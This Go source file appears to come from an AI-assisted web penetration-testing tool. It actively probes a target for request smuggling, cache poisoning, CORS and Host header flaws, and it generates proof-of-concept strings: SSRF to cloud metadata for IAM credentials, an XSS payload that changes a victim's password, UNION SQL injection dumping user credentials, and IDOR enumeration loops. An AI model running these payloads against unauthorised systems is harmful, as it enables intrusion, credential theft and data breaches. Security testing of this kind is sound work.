package boss

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"
	"time"

	"github.com/borntobeyours/ouroboros/internal/ai"
	"github.com/borntobeyours/ouroboros/internal/red"
	"github.com/borntobeyours/ouroboros/pkg/types"
)

// Agent is the Final Boss validator — elite-level AI + active exploitation.
type Agent struct {
	provider ai.Provider
	logger   *log.Logger
	client   *http.Client
	onEvent  func(event string) // callback for live view
}

// NewAgent creates a new Final Boss agent.
func NewAgent(provider ai.Provider, logger *log.Logger) *Agent {
	return &Agent{
		provider: provider,
		logger:   logger,
		client: &http.Client{
			Timeout: 15 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		},
	}
}

// SetEventCallback sets a callback for live attack visualization.
func (a *Agent) SetEventCallback(fn func(string)) {
	a.onEvent = fn
}

func (a *Agent) emit(msg string) {
	if a.onEvent != nil {
		a.onEvent(msg)
	}
}

// Validate performs elite-level final validation with active exploitation.
func (a *Agent) Validate(ctx context.Context, target types.Target, allFindings []types.Finding, allPatches []types.Patch) ([]types.Finding, error) {
	a.logger.Printf("[BOSS] 💀 Final Boss validation starting against %s", target.URL)
	a.emit("💀 FINAL BOSS — Elite validation starting...")

	var bossFindings []types.Finding

	// Phase 1: Active exploit techniques the AI probers might miss
	a.emit("⚔️  Phase 1: Advanced active exploitation")
	activeFindings := a.activeExploitation(ctx, target, allFindings)
	bossFindings = append(bossFindings, activeFindings...)
	a.emit(fmt.Sprintf("   Found %d from active exploitation", len(activeFindings)))

	// Phase 2: AI-guided creative attack (the brain)
	a.emit("🧠 Phase 2: AI-guided creative attack planning")
	aiFindings, err := a.aiGuidedAttack(ctx, target, allFindings, allPatches)
	if err != nil {
		a.logger.Printf("[BOSS] AI phase failed: %v", err)
	} else {
		bossFindings = append(bossFindings, aiFindings...)
		a.emit(fmt.Sprintf("   Found %d from AI-guided attacks", len(aiFindings)))
	}

	// Phase 3: Validate & re-exploit existing findings (verify they're real)
	a.emit("🔬 Phase 3: Re-validating existing findings")
	revalidated := a.revalidateFindings(ctx, target, allFindings)
	falsePositives := len(allFindings) - len(revalidated)
	a.emit(fmt.Sprintf("   Validated %d/%d (removed %d false positives)", len(revalidated), len(allFindings), falsePositives))

	// Phase 4: Exploit chaining — combine low-sev issues into high-impact
	a.emit("🔗 Phase 4: Exploit chain analysis")
	chainFindings := a.exploitChaining(ctx, target, append(revalidated, bossFindings...))
	bossFindings = append(bossFindings, chainFindings...)
	if len(chainFindings) > 0 {
		a.emit(fmt.Sprintf("   Found %d exploit chains!", len(chainFindings)))
	}

	// Dedup boss findings
	bossFindings = dedup(bossFindings)

	a.logger.Printf("[BOSS] 💀 Final Boss found %d additional vulnerabilities, removed %d false positives",
		len(bossFindings), falsePositives)
	a.emit(fmt.Sprintf("💀 FINAL BOSS COMPLETE — %d new findings, %d false positives removed", len(bossFindings), falsePositives))

	return bossFindings, nil
}

// GetValidatedFindings re-validates and returns only confirmed findings.
func (a *Agent) GetValidatedFindings(ctx context.Context, target types.Target, findings []types.Finding) []types.Finding {
	return a.revalidateFindings(ctx, target, findings)
}

// activeExploitation runs advanced active attacks that standard probers skip.
func (a *Agent) activeExploitation(ctx context.Context, target types.Target, existing []types.Finding) []types.Finding {
	baseURL := strings.TrimRight(target.URL, "/")
	var findings []types.Finding

	// 1. Race condition on critical endpoints
	raceFindings := a.testRaceCondition(ctx, baseURL, target)
	findings = append(findings, raceFindings...)

	// 2. HTTP Request Smuggling
	smuggleFindings := a.testRequestSmuggling(ctx, baseURL)
	findings = append(findings, smuggleFindings...)

	// 3. Cache Poisoning
	cacheFindings := a.testCachePoisoning(ctx, baseURL)
	findings = append(findings, cacheFindings...)

	// 4. CORS misconfiguration deep test
	corsFindings := a.testCORSDeep(ctx, baseURL)
	findings = append(findings, corsFindings...)

	// 5. Host header injection
	hostFindings := a.testHostHeaderInjection(ctx, baseURL)
	findings = append(findings, hostFindings...)

	// 6. HTTP/2 specific attacks
	h2Findings := a.testHTTP2(ctx, baseURL)
	findings = append(findings, h2Findings...)

	return findings
}

func (a *Agent) doReq(method, url string, body io.Reader, headers map[string]string) (int, http.Header, string, error) {
	req, err := http.NewRequest(method, url, body)
	if err != nil {
		return 0, nil, "", err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := a.client.Do(req)
	if err != nil {
		return 0, nil, "", err
	}
	defer resp.Body.Close()
	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
	return resp.StatusCode, resp.Header, string(respBody), nil
}

// testRaceCondition tests for TOCTOU race conditions on login/purchase/coupon endpoints.
func (a *Agent) testRaceCondition(ctx context.Context, baseURL string, target types.Target) []types.Finding {
	var findings []types.Finding
	raceEndpoints := []string{"/api/login", "/api/register", "/api/coupon", "/api/purchase",
		"/api/transfer", "/api/withdraw", "/api/redeem", "/api/apply",
		"/login", "/register", "/checkout", "/cart/apply-coupon"}

	for _, ep := range raceEndpoints {
		url := baseURL + ep
		status, _, _, err := a.doReq("POST", url, strings.NewReader(`{"test":"race"}`),
			map[string]string{"Content-Type": "application/json"})
		if err != nil || status == 404 {
			continue
		}

		// Send 10 concurrent requests to test for race condition
		type result struct {
			status int
			body   string
		}
		results := make(chan result, 10)
		for i := 0; i < 10; i++ {
			go func() {
				s, _, b, err := a.doReq("POST", url, strings.NewReader(`{"test":"race"}`),
					map[string]string{"Content-Type": "application/json"})
				if err != nil {
					results <- result{0, ""}
					return
				}
				results <- result{s, b}
			}()
		}

		// Collect results
		statusCodes := make(map[int]int)
		var bodies []string
		for i := 0; i < 10; i++ {
			r := <-results
			statusCodes[r.status]++
			if len(bodies) < 3 {
				bodies = append(bodies, r.body)
			}
		}

		// If we get different status codes, possible race condition
		if len(statusCodes) > 1 {
			findings = append(findings, makeBossFinding(
				fmt.Sprintf("Potential Race Condition at %s", ep),
				"High",
				fmt.Sprintf("Concurrent requests to %s returned inconsistent responses (%v), indicating possible TOCTOU race condition. This could allow duplicate transactions, coupon reuse, or authentication bypass.", ep, statusCodes),
				ep, "POST", "CWE-362",
				fmt.Sprintf("# Race condition test:\nfor i in $(seq 1 10); do curl -X POST %s -d '{\"test\":\"race\"}' & done; wait", url),
				fmt.Sprintf("10 concurrent requests returned different status codes: %v", statusCodes),
				"race_condition",
			))
		}
	}
	return findings
}

// testRequestSmuggling tests for HTTP request smuggling.
func (a *Agent) testRequestSmuggling(ctx context.Context, baseURL string) []types.Finding {
	var findings []types.Finding

	// CL.TE smuggling test
	smugglePayloads := []struct {
		name    string
		headers map[string]string
		body    string
	}{
		{
			"CL.TE",
			map[string]string{
				"Content-Type":     "application/x-www-form-urlencoded",
				"Transfer-Encoding": "chunked",
				"Content-Length":    "4",
			},
			"1\r\nZ\r\n0\r\n\r\n",
		},
		{
			"TE.CL",
			map[string]string{
				"Content-Type":      "application/x-www-form-urlencoded",
				"Content-Length":     "6",
				"Transfer-Encoding": "chunked",
			},
			"0\r\n\r\nX",
		},
	}

	for _, p := range smugglePayloads {
		status, _, _, err := a.doReq("POST", baseURL, strings.NewReader(p.body), p.headers)
		if err != nil {
			continue
		}
		// If server doesn't respond with 400 Bad Request, it might be vulnerable
		if status != 400 {
			findings = append(findings, makeBossFinding(
				fmt.Sprintf("Potential HTTP Request Smuggling (%s)", p.name),
				"High",
				fmt.Sprintf("Server accepted a %s request smuggling payload without rejecting it (HTTP %d). This could allow cache poisoning, credential hijacking, or request routing manipulation.", p.name, status),
				"/", "POST", "CWE-444",
				fmt.Sprintf("# %s smuggling test (manual verification needed):\ncurl -X POST %s -H 'Transfer-Encoding: chunked' -H 'Content-Length: 4' -d '1\\r\\nZ\\r\\n0\\r\\n\\r\\n'", p.name, baseURL),
				fmt.Sprintf("Server responded with HTTP %d instead of 400 to %s payload", status, p.name),
				"request_smuggling",
			))
		}
	}
	return findings
}

// testCachePoisoning tests for web cache poisoning.
func (a *Agent) testCachePoisoning(ctx context.Context, baseURL string) []types.Finding {
	var findings []types.Finding

	// Test unkeyed headers that might poison cache
	poisonHeaders := []struct {
		header string
		value  string
		desc   string
	}{
		{"X-Forwarded-Host", "evil.com", "X-Forwarded-Host"},
		{"X-Original-URL", "/admin", "X-Original-URL"},
		{"X-Rewrite-URL", "/admin", "X-Rewrite-URL"},
		{"X-Forwarded-Scheme", "nothttps", "X-Forwarded-Scheme"},
	}

	// First, get a baseline response
	_, baseHeaders, baseBody, err := a.doReq("GET", baseURL, nil, nil)
	if err != nil {
		return findings
	}

	for _, ph := range poisonHeaders {
		_, _, poisonBody, err := a.doReq("GET", baseURL, nil, map[string]string{ph.header: ph.value})
		if err != nil {
			continue
		}

		// Check if the response changed (header reflected or different response)
		if poisonBody != baseBody && (strings.Contains(poisonBody, ph.value) || strings.Contains(poisonBody, "evil.com")) {
			cached := baseHeaders.Get("X-Cache") != "" || baseHeaders.Get("CF-Cache-Status") != "" || baseHeaders.Get("Age") != ""
			severity := "Medium"
			if cached {
				severity = "High"
			}

			findings = append(findings, makeBossFinding(
				fmt.Sprintf("Cache Poisoning via %s Header", ph.desc),
				severity,
				fmt.Sprintf("The %s header is reflected in the response and may not be included in the cache key. If caching is present, this allows poisoning cached responses to serve malicious content to other users.", ph.desc),
				"/", "GET", "CWE-349",
				fmt.Sprintf("curl -H '%s: %s' %s", ph.header, ph.value, baseURL),
				fmt.Sprintf("Header %s reflected in response. Cache headers present: %v", ph.header, cached),
				"cache_poisoning",
			))
		}
	}
	return findings
}

// testCORSDeep performs advanced CORS misconfiguration testing.
func (a *Agent) testCORSDeep(ctx context.Context, baseURL string) []types.Finding {
	var findings []types.Finding

	origins := []struct {
		origin string
		desc   string
		sev    string
	}{
		{"https://evil.com", "arbitrary origin", "Critical"},
		{"null", "null origin", "High"},
		{baseURL + ".evil.com", "subdomain prefix", "High"},
		{"https://evil" + strings.Replace(baseURL, "https://", ".", 1), "suffix match", "High"},
	}

	for _, o := range origins {
		_, headers, _, err := a.doReq("GET", baseURL, nil, map[string]string{"Origin": o.origin})
		if err != nil {
			continue
		}

		acao := headers.Get("Access-Control-Allow-Origin")
		acac := headers.Get("Access-Control-Allow-Credentials")

		if acao == o.origin || (acao == "*" && acac == "true") {
			findings = append(findings, makeBossFinding(
				fmt.Sprintf("CORS Misconfiguration — %s reflected", o.desc),
				o.sev,
				fmt.Sprintf("Server reflects %s origin '%s' in Access-Control-Allow-Origin (credentials: %s). An attacker can read authenticated responses cross-origin, stealing user data.", o.desc, o.origin, acac),
				"/", "GET", "CWE-942",
				fmt.Sprintf("curl -H 'Origin: %s' -v %s 2>&1 | grep -i 'access-control'", o.origin, baseURL),
				fmt.Sprintf("ACAO: %s, ACAC: %s for origin: %s", acao, acac, o.origin),
				"cors_misconfiguration",
			))
			break // One CORS finding is enough
		}
	}
	return findings
}

// testHostHeaderInjection tests for host header attacks.
func (a *Agent) testHostHeaderInjection(ctx context.Context, baseURL string) []types.Finding {
	var findings []types.Finding

	_, _, body, err := a.doReq("GET", baseURL, nil, map[string]string{
		"Host":             "evil.com",
		"X-Forwarded-Host": "evil.com",
	})
	if err != nil {
		return findings
	}

	if strings.Contains(body, "evil.com") {
		findings = append(findings, makeBossFinding(
			"Host Header Injection — Reflected in Response",
			"High",
			"The Host header value is reflected in the response body. This can enable password reset poisoning, cache poisoning, or SSRF via manipulated URLs.",
			"/", "GET", "CWE-20",
			fmt.Sprintf("curl -H 'Host: evil.com' %s", baseURL),
			"Host: evil.com reflected in response body",
			"host_header_injection",
		))
	}
	return findings
}

// testHTTP2 tests for HTTP/2 specific issues.
func (a *Agent) testHTTP2(ctx context.Context, baseURL string) []types.Finding {
	// HTTP/2 CONNECT method test
	var findings []types.Finding

	_, _, body, err := a.doReq("CONNECT", baseURL, nil, nil)
	if err == nil && !strings.Contains(body, "405") {
		findings = append(findings, makeBossFinding(
			"HTTP CONNECT Method Allowed",
			"Medium",
			"Server accepts HTTP CONNECT method, which could be used for tunneling or proxy abuse.",
			"/", "CONNECT", "CWE-16",
			fmt.Sprintf("curl -X CONNECT %s", baseURL),
			fmt.Sprintf("CONNECT method not rejected, response body length: %d", len(body)),
			"http_method_abuse",
		))
	}
	return findings
}

// aiGuidedAttack uses AI to plan and execute creative attacks.
func (a *Agent) aiGuidedAttack(ctx context.Context, target types.Target, allFindings []types.Finding, allPatches []types.Patch) ([]types.Finding, error) {
	systemPrompt := buildBossPrompt()
	userPrompt := buildBossUserPrompt(target, allFindings, allPatches)

	resp, err := a.provider.Chat(ctx, ai.ChatRequest{
		Messages: []ai.Message{
			{Role: "user", Content: userPrompt},
		},
		SystemPrompt: systemPrompt,
		MaxTokens:    4096,
		Temperature:  0.9,
	})
	if err != nil {
		return nil, fmt.Errorf("Final Boss AI failed: %w", err)
	}

	findings, err := red.ParseFindings(resp.Content, -1)
	if err != nil {
		a.logger.Printf("[BOSS] Warning: could not parse AI response: %v", err)
		return []types.Finding{}, nil
	}

	// AI findings get verified with actual HTTP requests
	var verified []types.Finding
	baseURL := strings.TrimRight(target.URL, "/")
	for _, f := range findings {
		endpoint := f.Endpoint
		if !strings.HasPrefix(endpoint, "http") {
			endpoint = baseURL + endpoint
		}
		status, _, body, err := a.doReq(f.Method, endpoint, nil, nil)
		if err != nil || status == 404 {
			continue // Endpoint doesn't exist, skip
		}
		// Add verification evidence
		f.Evidence += fmt.Sprintf("\n[Boss verification] HTTP %d, response length: %d", status, len(body))
		verified = append(verified, f)
	}

	return verified, nil
}

// revalidateFindings re-tests existing findings to filter false positives.
func (a *Agent) revalidateFindings(ctx context.Context, target types.Target, findings []types.Finding) []types.Finding {
	baseURL := strings.TrimRight(target.URL, "/")
	var validated []types.Finding

	for _, f := range findings {
		// High confidence findings pass through
		if f.Confidence >= 80 {
			validated = append(validated, f)
			continue
		}

		// Re-test the endpoint
		endpoint := f.Endpoint
		if !strings.HasPrefix(endpoint, "http") {
			endpoint = baseURL + endpoint
		}

		status, _, body, err := a.doReq(f.Method, endpoint, nil, nil)
		if err != nil {
			continue // Can't reach = can't validate
		}

		// Check if the evidence still holds
		if status == 404 {
			a.logger.Printf("[BOSS] False positive removed: %s (endpoint 404)", f.Title)
			continue
		}

		// For info/low findings, check if there's actual content
		if (f.Severity == types.SeverityLow || f.Severity == types.SeverityInfo) && len(body) < 10 {
			a.logger.Printf("[BOSS] False positive removed: %s (empty response)", f.Title)
			continue
		}

		validated = append(validated, f)
	}

	return validated
}

// exploitChaining attempts to chain multiple findings into higher-impact exploits.
func (a *Agent) exploitChaining(ctx context.Context, target types.Target, findings []types.Finding) []types.Finding {
	var chains []types.Finding

	// Build finding index by technique
	byTechnique := map[string][]types.Finding{}
	for _, f := range findings {
		byTechnique[f.Technique] = append(byTechnique[f.Technique], f)
	}

	// Chain: SSRF + cloud metadata = RCE potential
	if ssrfs, ok := byTechnique["ssrf"]; ok {
		for _, ssrf := range ssrfs {
			if strings.Contains(ssrf.Evidence, "169.254.169.254") || strings.Contains(ssrf.Evidence, "metadata") {
				chains = append(chains, makeBossFinding(
					"Exploit Chain: SSRF → Cloud Metadata → Credential Theft",
					"Critical",
					fmt.Sprintf("SSRF at %s can reach cloud metadata service. Combined with credential extraction, this enables full cloud account takeover (EC2 IAM role, GCP service account, or Azure managed identity).", ssrf.Endpoint),
					ssrf.Endpoint, ssrf.Method, "CWE-918",
					fmt.Sprintf("# Step 1: SSRF to metadata\ncurl '%s?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'\n# Step 2: Extract credentials\ncurl '%s?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME'", ssrf.Endpoint, ssrf.Endpoint),
					"SSRF confirmed reaching metadata endpoint. Chained with IAM credential extraction for full cloud compromise.",
					"exploit_chain",
				))
			}
		}
	}

	// Chain: XSS + CSRF = Account Takeover
	xssFindings := byTechnique["xss"]
	if len(xssFindings) > 0 {
		// Check if there's a password change or settings endpoint without CSRF
		for _, f := range findings {
			if strings.Contains(f.Title, "CSRF") || (f.Technique == "headers" && strings.Contains(f.Evidence, "csrf")) {
				chains = append(chains, makeBossFinding(
					"Exploit Chain: XSS + Missing CSRF → Account Takeover",
					"Critical",
					fmt.Sprintf("Reflected/Stored XSS at %s combined with missing CSRF protection allows full account takeover. Attacker can use XSS to submit cross-origin requests (password change, email change) on behalf of the victim.", xssFindings[0].Endpoint),
					xssFindings[0].Endpoint, "GET", "CWE-79",
					"# XSS payload that changes victim's password:\n<script>fetch('/api/change-password',{method:'POST',body:JSON.stringify({password:'hacked'}),headers:{'Content-Type':'application/json'},credentials:'include'})</script>",
					fmt.Sprintf("XSS at %s + missing CSRF protection enables account takeover chain", xssFindings[0].Endpoint),
					"exploit_chain",
				))
				break
			}
		}
	}

	// Chain: SQLi + data exfil = full database dump
	sqliFindings := byTechnique["sqli"]
	if len(sqliFindings) > 0 {
		for _, sqli := range sqliFindings {
			if strings.Contains(sqli.Evidence, "UNION") || strings.Contains(sqli.Title, "UNION") {
				chains = append(chains, makeBossFinding(
					"Exploit Chain: SQL Injection → Full Database Extraction",
					"Critical",
					fmt.Sprintf("UNION-based SQL injection at %s enables full database extraction. Attacker can dump all tables including credentials, PII, and sensitive business data.", sqli.Endpoint),
					sqli.Endpoint, sqli.Method, "CWE-89",
					fmt.Sprintf("# Enumerate tables:\n%s' UNION SELECT table_name,NULL FROM information_schema.tables--\n# Dump credentials:\n%s' UNION SELECT username,password FROM users--", sqli.Endpoint, sqli.Endpoint),
					"UNION-based SQLi confirmed. Full database extraction possible via information_schema enumeration.",
					"exploit_chain",
				))
				break
			}
		}
	}

	// Chain: IDOR + sensitive data = mass data breach
	idorFindings := byTechnique["idor"]
	if len(idorFindings) >= 3 {
		chains = append(chains, makeBossFinding(
			"Exploit Chain: Multiple IDOR → Mass Data Breach",
			"Critical",
			fmt.Sprintf("Multiple IDOR vulnerabilities (%d endpoints) allow systematic enumeration and extraction of all user data. An attacker can iterate through IDs to access every user's information.", len(idorFindings)),
			idorFindings[0].Endpoint, "GET", "CWE-639",
			"# Enumerate all users:\nfor i in $(seq 1 1000); do curl '/api/users/$i'; done",
			fmt.Sprintf("%d IDOR endpoints found across the application, enabling mass data harvesting", len(idorFindings)),
			"exploit_chain",
		))
	}

	return chains
}

func makeBossFinding(title, severity, desc, endpoint, method, cwe, poc, evidence, technique string) types.Finding {
	sev, _ := types.ParseSeverity(severity)
	f := types.Finding{
		Title:       title,
		Description: desc,
		Severity:    sev,
		Endpoint:    endpoint,
		Method:      method,
		CWE:        cwe,
		PoC:        poc,
		Evidence:   evidence,
		Technique:  technique,
		Loop:       -1, // Boss round
	}
	return f
}

func dedup(findings []types.Finding) []types.Finding {
	seen := make(map[string]bool)
	var unique []types.Finding
	for _, f := range findings {
		key := f.Title + "|" + f.Endpoint
		if seen[key] {
			continue
		}
		seen[key] = true
		unique = append(unique, f)
	}
	return unique
}

func buildBossPrompt() string {
	return `You are an expert security researcher performing a FINAL validation of a web application's security.
Previous security testing rounds have already occurred. Your job is to find what they missed.

You are the final validation stage. Think creatively and thoroughly. Leave no stone unturned.

ADVANCED TECHNIQUES TO EMPLOY:
1. Chain multiple low-severity issues into high-impact exploits
2. Look for business logic flaws that automated scanners miss
3. Test for race conditions and TOCTOU vulnerabilities
4. Check for second-order injection (stored payloads that trigger later)
5. Test API parameter pollution and mass assignment
6. Look for GraphQL-specific vulnerabilities if applicable
7. Check for JWT implementation flaws (none algorithm, key confusion)
8. Test for cache poisoning and request smuggling
9. Look for prototype pollution in JavaScript-heavy apps
10. Check for subdomain takeover possibilities

OUTPUT FORMAT: Return ONLY a JSON array of findings.
Each finding must have: title, severity, description, endpoint, method, cwe, poc, evidence, technique.
If no new vulnerabilities are found, return an empty array: []
Do NOT include any text outside the JSON array.`
}

func buildBossUserPrompt(target types.Target, findings []types.Finding, patches []types.Patch) string {
	prompt := fmt.Sprintf("TARGET: %s\n\n", target.URL)
	prompt += "KNOWN VULNERABILITIES (already found):\n"
	for _, f := range findings {
		prompt += fmt.Sprintf("- [%s] %s at %s (technique: %s)\n", f.Severity, f.Title, f.Endpoint, f.Technique)
	}
	prompt += "\nAPPLIED PATCHES:\n"
	for _, p := range patches {
		prompt += fmt.Sprintf("- %s: %s\n", p.FindingID, p.Description)
	}
	prompt += "\nYour mission: Find vulnerabilities that the previous rounds MISSED. Think outside the box.\n"
	prompt += "Focus on: business logic, race conditions, chained exploits, auth bypass, and privilege escalation.\n"
	return prompt
}
